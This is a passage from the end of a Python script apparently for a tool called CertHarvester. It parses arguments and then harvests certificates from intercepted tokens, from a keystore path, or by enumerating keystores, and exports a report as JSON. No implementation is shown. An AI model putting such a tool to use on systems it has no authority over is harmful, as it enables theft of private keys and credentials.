    parser.add_argument("-v", "--verbose", action="store_true")
    args = parser.parse_args()

    harvester = CertHarvester(verbose=args.verbose)

    if args.from_intercept:
        result = harvester.harvest_from_tokens(args.from_intercept)
    elif args.keystore_path:
        result = harvester.harvest_path(args.keystore_path)
    else:
        result = harvester.enumerate_keystores()

    print_harvest_report(result)
    if args.output:
        export_json(result, args.output)
